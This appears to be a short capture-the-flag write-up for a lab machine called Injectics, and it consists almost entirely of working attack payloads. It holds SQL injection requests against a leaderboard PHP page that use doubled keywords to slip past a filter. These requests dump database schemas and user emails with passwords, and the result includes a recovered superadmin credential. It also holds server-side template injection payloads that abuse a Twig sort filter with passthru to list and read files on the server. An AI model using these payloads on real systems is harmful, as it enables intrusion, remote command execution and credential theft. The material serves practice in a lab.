# Injectics

Burp for Injectics table name:

```
POST /edit_leaderboard.php?rank=1&country=USA HTTP/1.1
Host: 10.201.115.115
Content-Type: application/x-www-form-urlencoded

gold=1%2Ccountry%3D(seSELECTlect%20group_concat(schema_name)%20from%20infoORrmation_schema.schemata)&silver=21&bronze=12345
```

Exfiltration:

```
POST /edit_leaderboard.php?rank=1&country=USA HTTP/1.1
Host: 10.201.115.115
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=8f3njtj64mgtfsm2898i82a0og

gold=1%2Ccountry%3D(seSELECTlect%20group_concat(email%2C0x3a%2CpasswoORrd)%20from%20bac_test.users%20WHERE%20email%20LIKE%20%27superadmin%25%27)&silver=21&bronze=12345
```

Decoded:

```
1,country=(seSELECTlect group_concat(email,0x3a,passwoORrd) from bac_test.users WHERE email LIKE '%admin%')
```

User:

```
superadmin@injectics.thm:34234vsdfwr2r2wf2r2
```

## SSTI

Suggested test, result will be in Home:

```
${{<%[%'"}}%
```

Code to exfiltrate flag name:

```
{{['ls -la /var/www/html/flags',""]|sort('passthru')}}
```

Code to exfiltrate flag:

```
{{['cat /var/www/html/flags/5d8af1dc14503c7e4bdc8e51a3469f48.txt',""]|sort('passthru')}}
```
